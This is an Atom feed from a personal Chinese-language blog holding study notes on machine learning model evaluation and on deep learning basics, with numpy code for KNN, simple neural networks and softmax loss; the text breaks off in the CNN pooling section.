<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>a meter sunshine</title>
  
  <subtitle>Program Life</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://wq371680537.github.io/"/>
  <updated>2021-04-28T13:19:04.639Z</updated>
  <id>https://wq371680537.github.io/</id>
  
  <author>
    <name>wq</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>周志华《机器学习》笔记</title>
    <link href="https://wq371680537.github.io/2021/04/28/%E5%91%A8%E5%BF%97%E5%8D%8E%E3%80%8A%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    <id>https://wq371680537.github.io/2021/04/28/周志华《机器学习》笔记/</id>
    <published>2021-04-28T11:50:36.000Z</published>
    <updated>2021-04-28T13:19:04.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="周志华《机器学习笔记》"><a href="#周志华《机器学习笔记》" class="headerlink" title="周志华《机器学习笔记》"></a>周志华《机器学习笔记》</h1><a id="more"></a><p>注：第一章绪论略</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h3 id="2-1经验误差与过拟合"><a href="#2-1经验误差与过拟合" class="headerlink" title="2.1经验误差与过拟合"></a>2.1经验误差与过拟合</h3><ol><li>m个样本，a个分类错误，错误率:E = a/m</li><li>精度 =  1 - 错误率 ,  精度 ：1 - a/m</li><li>预测输出与样本的真实输出之间的差异叫误差</li><li>学习器在训练集上的误差称为 “ 训练误差”  或者  “经验误差”</li><li>在新样本上的误差称为 “泛化误差“</li></ol><p><img src="/2021/04/28/周志华《机器学习》笔记/1.png" alt="1"></p><p>当学习器把训练样本学习的”太好“的时候，会导致泛化性下降，意思就是说面对新样本，效果不佳。这种现象叫做过拟合。（反过来，训练不够，导致欠拟合）</p><p>出现过拟合，不可避免，只能缓解，欠拟合，学习能力不足，加大学习</p><p><strong>理想的解决方案是对候选模型泛化误差进行评估，然后选择泛化误差最小的模型。</strong></p><h3 id="2-2模型评估方法"><a href="#2-2模型评估方法" class="headerlink" title="2.2模型评估方法"></a>2.2模型评估方法</h3><p>​    通过”测试集“来调试学习器对新样本的判别能力，然后以测试集上的”测试误差”作为“泛化误差”的近似。</p><p>测试样本：</p><ul><li>从样本真实分布中独立同分布采样</li><li>与训练集尽快可能互斥（未出现，未使用过的）</li></ul><p>举例：你是一个老师，教了学生10道题目，你对他进行考试时，肯定考的不是这10道题目，这样才能体现举一反三的能力。</p><p>但是，我们只有一个包含m个样例的数据集D = {(x_1,y_1),(x_2,y_2)….(xn,yn)}怎么去做到又训练又测试呢？</p><p>对D适当的处理，产生训练集S和测试集T</p><h4 id="2-2-1留出法"><a href="#2-2-1留出法" class="headerlink" title="2.2.1留出法"></a>2.2.1留出法</h4><p> ”留出法“直接将数据集D划分为两个互斥集合，一个训练集合S，一个测试集合T，也就是说D=S并T，S交T等于空集，在S上训练，在T评估。</p><p>举例：D = 1000个，训练 S = 700个，测试T = 300T，测试中有90个出错，错误率为（90/300）*100%=30%，精度为1-30%=70%</p><p>注意：训练/测试划分要尽能与数据分布一致</p><p>保留类别比例的采样方式称为“分层采集”</p><p>如：D=1000个=500个正+500个反</p><p>则 S = 700个= 350个正+350个反</p><p>​    T =  300个 = 150个正+150个反</p><p>然而，即便如此分类比例，在实际中先正先反也会产生不同结果，所以单次“留出法”并不可靠，一般采用若干随机划分。重复实验取平均值。</p><p>常见的方法：2/3~4/5样本用于训练，剩余用于测试。</p><h4 id="2-2-2交叉验证法"><a href="#2-2-2交叉验证法" class="headerlink" title="2.2.2交叉验证法"></a>2.2.2交叉验证法</h4><p>将数据集D划分为K个大小相似的互斥子集。每个子集D_i都互斥（也就是说D等于所有子集的并，任意两个子集的交集为空集）能与数据分布保存一致，也就是“分层采样”</p><p> 每次用k-1个子集的并集作为训练集，余下子集为测试集。最终返回K个测试结果的均值。叫做”K折交叉验证“，K通常取10，称为10折交叉验证</p><p><img src="/2021/04/28/周志华《机器学习》笔记/2.png" alt="2"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;周志华《机器学习笔记》&quot;&gt;&lt;a href=&quot;#周志华《机器学习笔记》&quot; class=&quot;headerlink&quot; title=&quot;周志华《机器学习笔记》&quot;&gt;&lt;/a&gt;周志华《机器学习笔记》&lt;/h1&gt;
    
    </summary>
    
    
      <category term="人工智能" scheme="https://wq371680537.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>深度学习笔记（一）</title>
    <link href="https://wq371680537.github.io/2021/04/26/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://wq371680537.github.io/2021/04/26/深度学习笔记（一）/</id>
    <published>2021-04-26T11:24:57.000Z</published>
    <updated>2021-04-28T11:44:32.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深度学习笔记（一）"><a href="#深度学习笔记（一）" class="headerlink" title="深度学习笔记（一）"></a>深度学习笔记（一）</h1><a id="more"></a><h2 id="第一章-深度学习必备知识点"><a href="#第一章-深度学习必备知识点" class="headerlink" title="第一章 深度学习必备知识点"></a>第一章 深度学习必备知识点</h2><h3 id="深度学习的套路"><a href="#深度学习的套路" class="headerlink" title="深度学习的套路"></a>深度学习的套路</h3><p> 与机器学习套路一样<br>1.收集数据并给定标签<br>2.训练一个分类器<br>3.测试，评估</p><pre><code>def train(train_images,train_labels)    return modeldef predict(model,test_images)    return model</code></pre><p>​    </p><h3 id="K-近邻"><a href="#K-近邻" class="headerlink" title="K-近邻"></a>K-近邻</h3><p>对于未知类别属性数据集的中点</p><p>1.计算已知类别数据集中的点与当前点的距离。</p><p>2.按照距离依次排序。</p><p>3.选取与当前点距离最小的K个点。</p><p>4.确定前K个点所在类别的出现概率。</p><p>5.返回前K个点出现频率最高的类别作为当前点预测分类。</p><p>注：KNN不需要训练集进行训练，训练时间复杂度为0，计算复杂度与文档数成正比。</p><p>数据库样例：CIFAR-10</p><p>10类标签，50000个测试数据，10000个测试数据，大小32*32</p><p>KNN怎么计算呢？</p><p>对测试图像矩阵与训练矩阵的差得到的矩阵求和</p><p>K-近邻代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">class NearestNeighbor</span><br><span class="line">  def __init__(self)</span><br><span class="line">      pass</span><br><span class="line">  def train(self,X,y)</span><br><span class="line">     self.Xtr = x</span><br><span class="line">     self.Ytr = y</span><br><span class="line">  def predict(self,X)</span><br><span class="line">     num_test = X.shape[0]</span><br><span class="line">     Ypred = np.zeros(num_test,dtype = self.ytr.dtype)</span><br><span class="line">     #</span><br><span class="line">     for i in xrang(num_test):</span><br><span class="line">        distance = np.sum(np.abs(self.Xtr-X[i,:]),axis = 1)</span><br><span class="line">        min_index = np.argmin(distance)#得到最小距离</span><br><span class="line">        Ypred[i] = self.ytr[min_index]</span><br><span class="line">    return Ypred</span><br></pre></td></tr></table></figure><p>一般把距离叫做超参数，是可以更改的。</p><p>不同的变换不能用K-近邻来表示图像分类</p><h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><p>实例：</p><p><img src="/2021/04/26/深度学习笔记（一）/1.png" alt="1"></p><p>权重矩阵*像素矩阵+偏置值=分类矩阵</p><p>预测错误怎么办？</p><p>采用损失函数：如SVM函数，损失值高就有问题了</p><p><img src="/2021/04/26/深度学习笔记（一）/2.png" alt="2"></p><p>如下图，设W1，W2，为两个模型，第一个模型，只考虑了第一个像素，虽然可能结果一样。</p><p>第一个模型只关注一部分，会导致过拟合。</p><p><img src="/2021/04/26/深度学习笔记（一）/3.png" alt="3"></p><p>为了解决这个问题，需要加入一个正则化，就是正则惩罚项</p><p><img src="/2021/04/26/深度学习笔记（一）/4.png" alt="4"></p><p>终极版的损失函数</p><p><img src="/2021/04/26/深度学习笔记（一）/5.png" alt="5"></p><p>sigmoid函数代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def sigmoid(x):</span><br><span class="line">    return 1.0/(1+np.exp(-x))</span><br></pre></td></tr></table></figure><p>Softmax分类器：（归一化的分类概率）</p><p><img src="/2021/04/26/深度学习笔记（一）/6.png" alt="6"></p><p>一个大的数可以映射成一个更大的数，小的映射大不了多少。</p><p>在log的（0，1）范围内，概率等于1，损失值为0，概率越小，损失值越大，符合log函数，要加上负号。</p><p>最优化softmax：（永远有损失值）</p><p><img src="/2021/04/26/深度学习笔记（一）/7.png" alt="7"></p><h3 id="机器学习"><a href="#机器学习" class="headerlink" title="机器学习"></a>机器学习</h3><p>不断的优化过程：跟下山很像，虽然可能有稍微的起伏，但是总体上是往下。</p><p>跟随梯度：</p><p><img src="/2021/04/26/深度学习笔记（一）/8.png" alt="8"></p><p>假设有4000张图片，一次跑完叫一个epoch</p><p>学习率：学习率太大会错过最低值</p><p>反向传播：</p><p><img src="/2021/04/26/深度学习笔记（一）/9.png" alt="9"></p><h2 id="第二章神经网络模型"><a href="#第二章神经网络模型" class="headerlink" title="第二章神经网络模型"></a>第二章神经网络模型</h2><p><img src="/2021/04/26/深度学习笔记（一）/10.png" alt="10"></p><p><img src="/2021/04/26/深度学习笔记（一）/11.png" alt="11"></p><p>非线性结构，加入激活函数使怎加非线性</p><p><img src="/2021/04/26/深度学习笔记（一）/12.png" alt="12"></p><p><img src="/2021/04/26/深度学习笔记（一）/13.png" alt="13"></p><p>sigmoid 函数的缺点，一直求导会导致梯度消失，就不能反向传播。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">数据预处理</span><br><span class="line">x-=np.mean(X,axis=0)</span><br><span class="line">x/=np.std(X,axis=0)</span><br><span class="line">权重初始化：</span><br><span class="line">W = 0.01*np.random.randn(D,H)</span><br><span class="line">b可以初始化为1或0</span><br></pre></td></tr></table></figure><h2 id="第三章神经网络案例实战"><a href="#第三章神经网络案例实战" class="headerlink" title="第三章神经网络案例实战"></a>第三章神经网络案例实战</h2><h3 id="手动实现简易三层神经网络"><a href="#手动实现简易三层神经网络" class="headerlink" title="手动实现简易三层神经网络"></a>手动实现简易三层神经网络</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">def sigmoid (x,derive=False):#derive=False不需要求导</span><br><span class="line">    if(derive==True):#反向传播进行求导其X=1/(1+np.exp(-x))</span><br><span class="line">        return x*(1-x)</span><br><span class="line">    return  1/(1+np.exp(-x))</span><br><span class="line">#五个样本，三个特征</span><br><span class="line">x=np.array([[0,0,1],</span><br><span class="line">           [0,1,1],</span><br><span class="line">           [1,0,1],</span><br><span class="line">           [1,1,1],</span><br><span class="line">           [0,0,1]]</span><br><span class="line">           )</span><br><span class="line">#标签</span><br><span class="line">y=np.array([[0],</span><br><span class="line">           [1],</span><br><span class="line">           [1],</span><br><span class="line">           [0],</span><br><span class="line">           [0]]</span><br><span class="line">           )</span><br><span class="line">np.random.seed(1)</span><br><span class="line">#定义三层神经网络</span><br><span class="line">#两个权重矩阵</span><br><span class="line">#*2-1是为了使范围在（-1，1）</span><br><span class="line">w0 = 2*np.random.random((3,4))-1#前面连3个特征，后面连四个神经元</span><br><span class="line">w1 = 2*np.random.random((4,1))-1#前连四个神经元，只有一个输出列</span><br><span class="line"></span><br><span class="line">for j in range(60000):</span><br><span class="line">    l0=x#l0为输入层</span><br><span class="line">    l1 = sigmoid(np.dot(l0,w0))</span><br><span class="line">    #l2为输出层</span><br><span class="line">    l2 = sigmoid(np.dot(l1,w1))</span><br><span class="line">    #均方误差项1/2(y-y*)^2求导后为y-y*</span><br><span class="line">    l2_error = y-l2</span><br><span class="line">    #print(l2_error.shape)</span><br><span class="line">    if(j%10000)==0:</span><br><span class="line">        print(&apos;Error&apos;+str(np.mean(np.abs(l2_error))))</span><br><span class="line">    l2_delta = l2_error * sigmoid(l2,derive=True)#</span><br><span class="line">    #print(l2_delta.shape)</span><br><span class="line">    l1_error = l2_delta.dot(w1.T)#需要对w1进行转置操作</span><br><span class="line">    l1_delta = l1_error*sigmoid(l1,derive=True)</span><br><span class="line">    #完成上面的反向传播后进行更改值</span><br><span class="line">    w1 += l1.T.dot(l2_delta)</span><br><span class="line">    w0 += l0.T.dot(l1_delta)</span><br></pre></td></tr></table></figure><h3 id="神经网络的全连接分类实现"><a href="#神经网络的全连接分类实现" class="headerlink" title="神经网络的全连接分类实现"></a>神经网络的全连接分类实现</h3><p>普通练习：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">def sigmoid (x,derive=False):#derive=False不需要求导</span><br><span class="line">    if(derive==True):#反向传播进行求导其X=1/(1+np.exp(-x))</span><br><span class="line">        return x*(1-x)</span><br><span class="line">    return  1/(1+np.exp(-x))</span><br><span class="line">#五个样本，三个特征</span><br><span class="line">x=np.array([[0,0,1],</span><br><span class="line">           [0,1,1],</span><br><span class="line">           [1,0,1],</span><br><span class="line">           [1,1,1],</span><br><span class="line">           [0,0,1]]</span><br><span class="line">           )</span><br><span class="line">#标签</span><br><span class="line">y=np.array([[0],</span><br><span class="line">           [1],</span><br><span class="line">           [1],</span><br><span class="line">           [0],</span><br><span class="line">           [0]]</span><br><span class="line">           )</span><br><span class="line">np.random.seed(1)</span><br><span class="line">#定义三层神经网络</span><br><span class="line">#两个权重矩阵</span><br><span class="line">#*2-1是为了使范围在（-1，1）</span><br><span class="line">w0 = 2*np.random.random((3,4))-1#前面连3个特征，后面连四个神经元</span><br><span class="line">w1 = 2*np.random.random((4,1))-1#前连四个神经元，只有一个输出列</span><br><span class="line"></span><br><span class="line">for j in range(5):</span><br><span class="line">    l0=x#l0为输入层</span><br><span class="line">    l1 = sigmoid(np.dot(l0,w0))</span><br><span class="line">    #l2为输出层</span><br><span class="line">    l2 = sigmoid(np.dot(l1,w1))</span><br><span class="line">    #均方误差项1/2(y-y*)^2求导后为y-y*</span><br><span class="line">    l2_error = y-l2</span><br><span class="line">    #print(l2_error.shape)</span><br><span class="line">    if(j%10000)==0:</span><br><span class="line">        print(&apos;Error&apos;+str(np.mean(np.abs(l2_error))))</span><br><span class="line">    l2_delta = l2_error * sigmoid(l2,derive=True)#</span><br><span class="line">    #print(l2_delta.shape)</span><br><span class="line">    l1_error = l2_delta.dot(w1.T)#需要对w1进行转置操作</span><br><span class="line">    l1_delta = l1_error*sigmoid(l1,derive=True)</span><br><span class="line">    #完成上面的反向传播后进行更改值</span><br><span class="line"></span><br><span class="line">    w1 += l1.T.dot(l2_delta)</span><br><span class="line">    w0 += l0.T.dot(l1_delta)</span><br></pre></td></tr></table></figure><p>手写神经网络训练图片：</p><p>部分代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">神经网络传播过程</span><br><span class="line">#day2_CIFAR_10.py</span><br><span class="line">from layer_utils import *</span><br><span class="line">import numpy as np</span><br><span class="line">class TwoLayerNet(object):</span><br><span class="line">    def __int__(self,input_dim=3*32*32,hidden_dim=100,num_classes=10,weight_scale=1e-3,reg=0.0):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :param input_dim: 输入数据的大小:3*32*32的彩色图</span><br><span class="line">        :param hidden_dim:隐藏层的神经元的 个数</span><br><span class="line">        :param num_classes:类别数</span><br><span class="line">        :param weight_scale:随基初始化的权重</span><br><span class="line">        :param reg:惩罚的权重项</span><br><span class="line">        :return:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        self.params=&#123;&#125;</span><br><span class="line">        self.reg = reg</span><br><span class="line">        self.params[&apos;w1&apos;] = weight_scale * np.random.randn(input_dim,hidden_dim)</span><br><span class="line">        self.params[&apos;b1&apos;] = np.zeros((1,hidden_dim))#偏置项拿0初始化</span><br><span class="line">        self.params[&apos;w2&apos;] = weight_scale *np.random.randn(hidden_dim,num_classes)</span><br><span class="line">        self.params[&apos;b2&apos;] = np.zeros(1,num_classes)#偏置项拿0初始化</span><br><span class="line">    def loss (self,X,y=None):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :param x:</span><br><span class="line">        :param y:</span><br><span class="line">        :return:</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        scores = None</span><br><span class="line">        N = X.shape[0]</span><br><span class="line">        w1,b1 = self.params[&apos;w2&apos;],self.params[&apos;b1&apos;]</span><br><span class="line">        w2,b2 = self.params[&apos;w2&apos;],self.params[&apos;b2&apos;]</span><br><span class="line">        h1,cache1 = affine_relu_forward(X,w1,b1)#h1：中间输出结果</span><br><span class="line">        out,cache2 = affine_forward(h1,w2,b2)</span><br><span class="line">        scores = out#每个类别的得分值</span><br><span class="line"></span><br><span class="line">        if y is None:</span><br><span class="line">            return scores</span><br><span class="line">        loss,grads = 0 ,&#123;&#125;#存梯度的值</span><br><span class="line">        data_loss,dscores = softmax_loss(scores,y)</span><br><span class="line">        reg_loss = 0.5 * self.reg*np.sum(w1*w1) + 0.5 *self.reg*np.sum(w2*w2)#正则化</span><br><span class="line">        loss = data_loss + reg_loss</span><br><span class="line">        dh1,dw2,db2 = affine_backward(dscores,cache2)</span><br><span class="line">        dx,dw1,db1 = affine_relu_bacekward(dh1,cache1)</span><br><span class="line">        dw2+= self.reg*w2</span><br><span class="line">        dw1+= self.reg*w1</span><br><span class="line">        grads[&apos;w1&apos;] = dw1</span><br><span class="line">        grads[&apos;b1&apos;] = db1</span><br><span class="line">        grads[&apos;w2&apos;] = dw2</span><br><span class="line">        grads[&apos;b2&apos;] = db2</span><br><span class="line">        return loss ,grads</span><br><span class="line">各层值的传播函数如下：</span><br><span class="line">import numpy as np</span><br><span class="line">def affine_relu_forward(x,w,b):</span><br><span class="line">    a,fc_cache = affine_forward(x,w,b)</span><br><span class="line">    out,relu_cache = relu_forward(a)</span><br><span class="line">    cache = (fc_cache,relu_cache)</span><br><span class="line">    return out,cache</span><br><span class="line">def relu_backward(dout,cache):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    :param dout:</span><br><span class="line">    :param cache:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    dx,x = None,cache</span><br><span class="line">    dx=dout</span><br><span class="line"></span><br><span class="line">def affine_backward(dout,cache):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    :param dout:</span><br><span class="line">    :param cache:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    x,w,b = cache</span><br><span class="line">    dx,dw,db = None,None,None</span><br><span class="line">    dx = np.dot(dout,w.T)</span><br><span class="line">    dx = np.reshape(dx,x.shape)</span><br><span class="line">    x_row = x.reshape(x.shape[0],-1)</span><br><span class="line">    dw = np.dot(x_row.T,dout)</span><br><span class="line">    db = np.sum(dout,axis=0,keepdims=True)</span><br><span class="line">    return dx ,dw ,db</span><br><span class="line"></span><br><span class="line"># def affine_forward(x,w,b):</span><br><span class="line">#     &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">def affine_forward(x,w,b):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    :param x:</span><br><span class="line">    :param w:</span><br><span class="line">    :param b:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    out = None</span><br><span class="line">    N = x.shape[0]</span><br><span class="line">    x_row = x.reshape[N,-1]</span><br><span class="line">    out = np.dot(x_row,w)+b</span><br><span class="line">    cache = (x,w,b)</span><br><span class="line">    return out,cache</span><br><span class="line">def affine_relu_forward(x,w,b):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    :param x:</span><br><span class="line">    :param w:</span><br><span class="line">    :param b:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    a,fc_cache = affine_forward(x,w,b)#全连接后的值</span><br><span class="line">    out,relu_cache = relu_backward(a)#经过relu层后的值</span><br><span class="line">    cache = (fc_cache,relu_cache)</span><br><span class="line">    return out ,cache</span><br><span class="line">def affine_relu_bacekward(dout,cache):</span><br><span class="line">    fc_cache,relu_cache = cache</span><br><span class="line">    da = relu_backward(dout,relu_cache)</span><br><span class="line">    dx,dw,db = affine_backward(da,fc_cache)</span><br><span class="line">    return dx,dw,db</span><br><span class="line">def relu_forward(x):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    :param x:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    out = None</span><br><span class="line">    out = ReLU(x)</span><br><span class="line">    cache = x</span><br><span class="line">    return out,cache</span><br><span class="line">def relu_backward(dout,cache):</span><br><span class="line">    dx,x=None,cache</span><br><span class="line">    dx = dout</span><br><span class="line">    dx [x&lt;=0]= 0</span><br><span class="line">    return dx</span><br><span class="line">def affine_relu_backward(dout,cache):</span><br><span class="line">    fc_cache,relu_cache = cache</span><br><span class="line">    da = relu_backward(dout,fc_cache)</span><br><span class="line">    dx,dw,db = affine_backward(da,fc_cache)</span><br><span class="line">    return dx,dw,db</span><br><span class="line">def ReLU(x):</span><br><span class="line">    return np.maximum(0,x)#比0大取x，小取0</span><br><span class="line">def softmax_loss(x,y):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    :param x:</span><br><span class="line">    :param y:</span><br><span class="line">    :return:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    probs = np.exp(x-np.max(x,axis=1,keepdims=True))#归一化操作</span><br><span class="line">    probs/= np.sum(probs,axis=1,keepdims=True)</span><br><span class="line">    N = x.shape[0]</span><br><span class="line">    loss = -np.sum(np.log(probs[np.arange(N),y]))/N</span><br><span class="line">    dx = probs.copy()</span><br><span class="line">    dx[np.arange(N),y]-=1#softmax 层求梯度的过程</span><br><span class="line">    dx/=N</span><br></pre></td></tr></table></figure><h2 id="第四章卷积神经网络"><a href="#第四章卷积神经网络" class="headerlink" title="第四章卷积神经网络"></a>第四章卷积神经网络</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>步骤：准备数据—&gt;在图中前向传播得到损失函数—-&gt;反向传播计算梯度值—-&gt;更新参数的一次循环</p><p>应用：识别，检索，物体检测，元素分离（GPU）</p><p><img src="/2021/04/26/深度学习笔记（一）/14.png" alt="14"></p><p>卷积神经网络的组成：输入层，卷积层，激活函数，池化层，全连接层</p><p>一张图片—-&gt;低级特征提取—-&gt;中级特征提取—-&gt;高级特征提取—–&gt;可训练的分类器</p><h3 id="计算过程"><a href="#计算过程" class="headerlink" title="计算过程"></a>计算过程</h3><p><img src="/2021/04/26/深度学习笔记（一）/15.png" alt="15"></p><p><img src="/2021/04/26/深度学习笔记（一）/16.png" alt="16"></p><p><img src="/2021/04/26/深度学习笔记（一）/17.png" alt="17"></p><p>滑动的步长：stride = 2，如果是一个7x7的输入得到一个3x3的输出</p><p>可以加上一圈padding项使图片的边缘信息变成非边缘，有利于利用边缘信息，可以用0填充。Pad=1加1圈，Pad=2加两圈</p><h3 id="计算输出大小"><a href="#计算输出大小" class="headerlink" title="计算输出大小"></a>计算输出大小</h3><p>例子：</p><p>输入 = 7x7 ,Filter  = 3x3,pad = 1,stride=1(步长),Outpout=?</p><p>h_I=w_I=7</p><p>Filter_h=Filter_w=3</p><p>h_o=(h_I-Filter_h+2Pad)/stride+1=7</p><p>w_o=(w_I-Filter_w+2Pad)/stride+1=7</p><h3 id="池化层（Pooling-layer）"><a href="#池化层（Pooling-layer）" class="headerlink" title="池化层（Pooling layer）"></a>池化层（Pooling 